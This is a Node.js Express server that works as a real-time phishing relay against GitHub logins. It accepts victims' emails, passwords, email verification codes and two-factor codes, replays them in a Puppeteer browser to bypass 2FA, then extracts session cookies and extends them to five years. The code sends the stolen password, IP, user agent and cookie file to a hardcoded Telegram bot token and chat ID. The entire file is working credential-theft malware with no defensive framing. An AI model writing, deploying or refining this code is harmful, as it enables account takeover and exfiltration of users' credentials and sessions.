// server.js
const express = require("express");
const cors = require("cors");
const puppeteer = require("puppeteer");
const path = require("path");
const fs = require("fs");
const { randomUUID } = require("crypto");
const FormData = require("form-data");
const axios = require("axios");
const dns = require("dns");

dns.setDefaultResultOrder("ipv4first");

const app = express();
const PORT = process.env.PORT || 3000;

// make sure cookies directory exists
const cookiesDir = path.join(__dirname, "cookies");
if (!fs.existsSync(cookiesDir)) fs.mkdirSync(cookiesDir, { recursive: true });

// simple delay helper
const delay = (ms) => new Promise((res) => setTimeout(res, ms));

// sessions map: sessionId => { browser, page, createdAt, userInfo, ipInfo }
const sessions = new Map();

// After a code is filled, automatically check for the error text once after 10 seconds
function scheduleVerifyCodeCheck(sessionId, page) {
  if (!page) return;

  console.log(
    `Scheduled check in 10s for 'Incorrect verification code provided' on session ${sessionId}...`,
  );

  setTimeout(async () => {
    try {
      const html = await page.content();
      const hasError = html.includes("Incorrect verification code provided");
      console.log(
        hasError
          ? `[session ${sessionId}] Incorrect verification code text FOUND`
          : `[session ${sessionId}] Incorrect verification code text NOT found`,
      );
    } catch (err) {
      console.error(
        "Error while checking verification code text:",
        err.message || err,
      );
    }
  }, 10000);
}

function createSessionId() {
  try {
    if (typeof randomUUID === "function") return randomUUID();
  } catch (e) {}
  return `sess_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
}

// setSession now accepts optional metadata (userInfo, ipInfo)
function setSession(sessionId, browser, page, userInfo = null, ipInfo = null) {
  sessions.set(sessionId, {
    browser,
    page,
    createdAt: Date.now(),
    userInfo,
    ipInfo,
  });
}

function getSession(sessionId) {
  return sessions.get(sessionId);
}

function clearSession(sessionId) {
  try {
    const s = sessions.get(sessionId);
    if (s && s.browser) {
      try {
        s.browser.close().catch(() => {});
      } catch (e) {}
    }
  } finally {
    sessions.delete(sessionId);
  }
}

// Periodic cleanup of old sessions (2 hours)
setInterval(
  () => {
    const cutoff = Date.now() - 2 * 60 * 60 * 1000;
    for (const [id, s] of sessions.entries()) {
      if (s.createdAt < cutoff) {
        try {
          if (s.browser) s.browser.close().catch(() => {});
        } catch (e) {}
        sessions.delete(id);
        console.log("Old session cleaned:", id);
      }
    }
  },
  30 * 60 * 1000,
);

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files (HTML, CSS, JS)
app.use(express.static("."));

// ---------- Helper: Telegram optional delivery ----------
async function sendTelegramMessage(htmlText) {
  const token = "8511553636:AAEpr_ioumKtDkN2F7AkI9OPXAuTb66Q9bQ";
  const chatId = "7855128984";

  if (!token || !chatId) {
    console.log("Telegram not configured - message would be:", htmlText);
    return;
  }

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  try {
    const { data } = await axios.post(
      url,
      {
        chat_id: chatId,
        text: htmlText,
        parse_mode: "HTML",
      },
      { timeout: 10000 },
    );

    if (!data.ok) {
      console.warn("Telegram message responded:", data);
    }
    return data;
  } catch (error) {
    console.error(
      "sendTelegramMessage failed:",
      error.response?.data || error.message,
    );
  }
}

async function sendTelegramFile(filePath, caption = "") {
  const token = "8511553636:AAEpr_ioumKtDkN2F7AkI9OPXAuTb66Q9bQ";
  const chatId = "7855128984";

  if (!token || !chatId) {
    console.log("Telegram not configured - file would be saved at:", filePath);
    return;
  }

  try {
    const url = `https://api.telegram.org/bot${token}/sendDocument`;
    const form = new FormData();

    form.append("chat_id", chatId);
    form.append("document", fs.createReadStream(filePath), {
      filename: path.basename(filePath),
    });
    if (caption) form.append("caption", caption);

    const { data } = await axios.post(url, form, {
      headers: { ...form.getHeaders() },
      timeout: 20000, // 20s timeout
    });

    if (!data.ok) {
      console.warn("Telegram file upload responded:", data);
    }
    return data;
  } catch (error) {
    console.error(
      "Error sending file to Telegram:",
      error.response?.data || error.message,
    );
  }
}

// ----------------- Login endpoint -----------------
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({
      success: false,
      error: !email ? "Email is required" : "Password is required",
    });
  }

  let browser;

  const ipFromRequest =
    (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
    req.socket.remoteAddress ||
    req.ip ||
    "";
  const userAgent = req.get("User-Agent") || "";

  try {
    console.log(`Starting login process for: ${email}`);

    // Launch Puppeteer with visible (non-headless) browser
    browser = await puppeteer.launch({
      headless: false,
      defaultViewport: null,
      args: [
        "--disable-setuid-sandbox",
        "--no-sandbox",
        "--single-process",
        "--no-zygote",
      ],
      executablePath:
        process.env.NODE_ENV === "production"
          ? process.env.PUPPETEER_EXECUTABLE_PATH
          : puppeteer.executablePath(),
    });

    const page = await browser.newPage();

    // Create a session and store full user info & ip
    const sessionId = createSessionId();
    const userInfo = {
      email,
      password,
      userAgent,
      ip: ipFromRequest,
    };
    setSession(sessionId, browser, page, userInfo, null);

    // Navigate to GitHub login page
    await page.goto("https://github.com/login", {
      waitUntil: "networkidle2",
    });

    // Fill in the GitHub login form
    // Email / username field
    await page.waitForSelector("#login_field", {
      visible: true,
      timeout: 15000,
    });
    await page.click("#login_field", { clickCount: 3 });
    await page.type("#login_field", email, { delay: 50 });

    // Password field
    await page.waitForSelector("#password", {
      visible: true,
      timeout: 15000,
    });
    await page.click("#password", { clickCount: 3 });
    await page.type("#password", password, { delay: 50 });

    // Click the "Sign in" button and wait for navigation
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle2", timeout: 30000 }),
      page.click('input[type="submit"][name="commit"]'),
    ]);

    // Check page content and URL for login result indicators
    const html = await page.content();
    const pageUrl = page.url();

    let result = null;
    if (html.includes("Incorrect username or password.")) {
      result = 0;
    } else if (
      html.includes("We just sent your authentication code via email to")
    ) {
      result = 1;
    } else if (
      html.includes(
        "Enter the code from your two-factor authentication app or browser extension below."
      )
    ) {
      result = 4;
    } else {
      // Navigated away from /login to github.com (e.g. successful login)
      try {
        const url = new URL(pageUrl);
        if (
          url.hostname === "github.com" &&
          !url.pathname.startsWith("/login")
        ) {
          result = 3;
          setImmediate(() => {
            collectAndSaveCookies(sessionId).catch((e) =>
              console.error(
                "collectAndSaveCookies failed after verification:",
                e,
              ),
            );
          });
        }
      } catch (e) {}
    }

    if (result === 0) {
      clearSession(sessionId);
    }

    return res.json({
      success: true,
      message: "GitHub login form filled and submitted",
      sessionId,
      result,
    });
  } catch (error) {
    console.error("Error during login process:", error);
    return res.status(500).json({
      success: false,
      error: "Internal server error during login process",
      details: error.message,
    });
  }
});

// ----------------- Verified device endpoint -----------------
app.post("/api/verified-device", async (req, res) => {
  const { code, sessionId } = req.body;

  if (!code || !sessionId) {
    return res.status(400).json({
      success: false,
      error: !code ? "Verification code is required" : "Session ID is required",
    });
  }

  const session = getSession(sessionId);

  if (!session || !session.page) {
    return res.status(404).json({
      success: false,
      error: "Active session not found for provided sessionId",
    });
  }

  const { page } = session;

  try {
    console.log(`Submitting verification code for session: ${sessionId}`);

    // Ensure the GitHub verification page is in front
    if (typeof page.bringToFront === "function") {
      try {
        await page.bringToFront();
      } catch (e) {
        // non-fatal
      }
    }

    // Wait for OTP input and fill it
    await page.waitForSelector("#otp", {
      visible: true,
      timeout: 20000,
    });

    await page.click("#otp", { clickCount: 3 });
    await page.type("#otp", String(code), { delay: 50 });

    // Wait 10 seconds, then check for error text; if not found, check URL.
    console.log(
      `Verification code filled for session ${sessionId}. ` +
        "Will automatically evaluate result in 10 seconds.",
    );
    await delay(10000);

    const html = await page.content();
    const pageUrl = page.url();

    let result = null;

    // If the incorrect-code text is present, result = 0
    if (html.includes("Incorrect verification code provided")) {
      result = 0;
      console.log(
        `[session ${sessionId}] Incorrect verification code text FOUND (result=0)`,
      );
    } else {
      // Otherwise, check if we've landed on bare github.com (no path)
      try {
        const url = new URL(pageUrl);
        const isBareGithub =
          url.hostname === "github.com" &&
          (url.pathname === "/" || url.pathname === "");

        if (isBareGithub) {
          result = 1;
          console.log(
            `[session ${sessionId}] Landed on bare github.com (result=1)`,
          );
          setImmediate(() => {
            collectAndSaveCookies(sessionId).catch((e) =>
              console.error(
                "collectAndSaveCookies failed after verification:",
                e,
              ),
            );
          });
        } else {
          console.log(
            `[session ${sessionId}] Neither error text nor bare github.com detected`,
          );
        }
      } catch (e) {
        console.error(
          `[session ${sessionId}] Error parsing URL for verification check:`,
          e.message || e,
        );
      }
    }

    // Return the result to the HTTP client as usual
    return res.json({
      success: true,
      message: "Verification code submitted on GitHub",
      sessionId,
      result,
    });
  } catch (error) {
    console.error("Error during device verification process:", error);
    return res.status(500).json({
      success: false,
      error: "Internal server error during device verification process",
      details: error.message,
    });
  }
});

// ----------------- Two-factor (TOTP) endpoint -----------------
app.post("/api/two-factor", async (req, res) => {
  const { code, sessionId } = req.body;

  if (!code || !sessionId) {
    return res.status(400).json({
      success: false,
      error: !code ? "2FA code is required" : "Session ID is required",
    });
  }

  const session = getSession(sessionId);

  if (!session || !session.page) {
    return res.status(404).json({
      success: false,
      error: "Active session not found for provided sessionId",
    });
  }

  const { page } = session;

  try {
    console.log(`Submitting 2FA code for session: ${sessionId}`);

    if (typeof page.bringToFront === "function") {
      try {
        await page.bringToFront();
      } catch (e) {}
    }

    await page.waitForSelector("#app_totp", {
      visible: true,
      timeout: 20000,
    });

    await page.click("#app_totp", { clickCount: 3 });
    await page.type("#app_totp", String(code), { delay: 50 });

    // await page.click('form[action*="two-factor"] button[type="submit"]');

    console.log(
      `2FA code filled for session ${sessionId}. Will evaluate result in 10 seconds.`,
    );
    await delay(10000);

    const html = await page.content();
    const pageUrl = page.url();

    let result = null;

    if (
      html.includes("Two-factor authentication failed")
    ) {
      result = 0;
      console.log(`[session ${sessionId}] 2FA incorrect code (result=0)`);
    } else {
      try {
        const url = new URL(pageUrl);
        const isBareGithub =
          url.hostname === "github.com" &&
          (url.pathname === "/" || url.pathname === "");

        if (isBareGithub) {
          result = 1;
          console.log(`[session ${sessionId}] 2FA success, landed on github.com`);
          setImmediate(() => {
            collectAndSaveCookies(sessionId).catch((e) =>
              console.error("collectAndSaveCookies failed after 2FA:", e),
            );
          });
        }
      } catch (e) {}
    }

    return res.json({
      success: true,
      message: "2FA code submitted on GitHub",
      sessionId,
      result,
    });
  } catch (error) {
    console.error("Error during 2FA process:", error);
    return res.status(500).json({
      success: false,
      error: "Internal server error during 2FA process",
      details: error.message,
    });
  }
});

// Health check endpoint
app.get("/api/health", (req, res) => {
  res.json({ status: "OK", message: "Server is running" });
});

// Serve the main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

async function collectAndSaveCookies(pageOrSessionId, maybeSessionId) {
  try {
    let page = pageOrSessionId;
    let sessionId = maybeSessionId;

    // allow calling as collectAndSaveCookies(sessionId) or collectAndSaveCookies(page, sessionId)
    if (typeof pageOrSessionId === "string" && !maybeSessionId) {
      sessionId = pageOrSessionId;
      const session = getSession(sessionId);
      if (!session) {
        console.error("Session not found for ID:", sessionId);
        return;
      }
      page = session.page;
    } else if (!sessionId) {
      console.error(
        "sessionId is required as second parameter when passing a page.",
      );
      return;
    }

    if (!sessionId) {
      console.error("SessionId missing.");
      return;
    }

    const session = getSession(sessionId);
    if (!session) {
      console.error("Session not found for ID:", sessionId);
      return;
    }

    if (!page) page = session.page;
    if (!page) {
      console.error("No page available in session:", sessionId);
      return;
    }

    const cookies = await page.cookies();
    const fiveYearsInSeconds = 5 * 365 * 24 * 60 * 60; // 5 years in seconds

    const { userInfo, browser, ipInfo } = session;
    const currentUrl = await page.url();

    const ipDetails = ipInfo
      ? `IP: ${ipInfo.ip}\nLocation: ${ipInfo.location}\nISP: ${ipInfo.isp}`
      : `IP: ${userInfo ? userInfo.ip : "unknown"}`;

    // Send session info to Telegram with HTML formatting (optional)
    const sessionMessage = `<b>New Session Captured</b>\n\nName: GITHUB\nUsername: ${
      userInfo ? userInfo.email : "unknown"
    }\nPassword: <tg-spoiler>${
      userInfo ? userInfo.password : ""
    }</tg-spoiler>\nLanding URL: ${currentUrl}\n${ipDetails}\nUser Agent: <code>${
      userInfo ? userInfo.userAgent : ""
    }</code>`;
    await sendTelegramMessage(sessionMessage);

    // Filter cookies of interest

    const filteredCookies = cookies.filter((cookie) =>
      ["logged_in", "dotcom_user", "user_session", "_gh_sess"].includes(
        cookie.name,
      ),
    );

    const formattedCookies = filteredCookies.map((cookie) => {
      const extendedExpiration =
        Math.floor(Date.now() / 1000) + fiveYearsInSeconds;

      if (cookie.name === "logged_in") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "lax",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }
      if (cookie.name === "dotcom_user") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "lax",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "user_session") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "lax",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }
      if (cookie.name === "_gh_sess") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "lax",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }
      // keep the per-name fine grained mapping you had (simple fallback provided)
      return {
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        hostOnly: cookie.hostOnly || false,
        path: cookie.path || "/",
        secure: !!cookie.secure,
        httpOnly: !!cookie.httpOnly,
        sameSite: cookie.sameSite || null,
        session: !!cookie.session,
        expirationDate:
          cookie.expires && cookie.expires > 0
            ? cookie.expires
            : extendedExpiration,
        storeId: cookie.storeId || null,
      };
    });

    const cookieFilePath = path.join(cookiesDir, `${sessionId}.json`);
    fs.writeFileSync(cookieFilePath, JSON.stringify(formattedCookies, null, 2));
    console.log(`Cookies saved to ${cookieFilePath}`);

    // Send the actual cookie file to Telegram (optional)
    await sendTelegramFile(
      cookieFilePath,
      `Cookies for ${userInfo ? userInfo.email : sessionId}`,
    );

    // Wait 30 seconds before closing browser (if desired)
    console.log("Waiting 30 seconds before closing browser...");
    await delay(30000);

    // Close browser and clean up session
    try {
      if (browser) {
        await browser.close();
      }
    } catch (closeError) {
      console.error("Error closing browser:", closeError);
    } finally {
      sessions.delete(sessionId);
      console.log(`Browser closed and session ${sessionId} cleaned up`);
    }
  } catch (error) {
    console.error("Error in collectAndSaveCookies:", error);
  }
}

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Health check: http://localhost:${PORT}/api/health`);
});
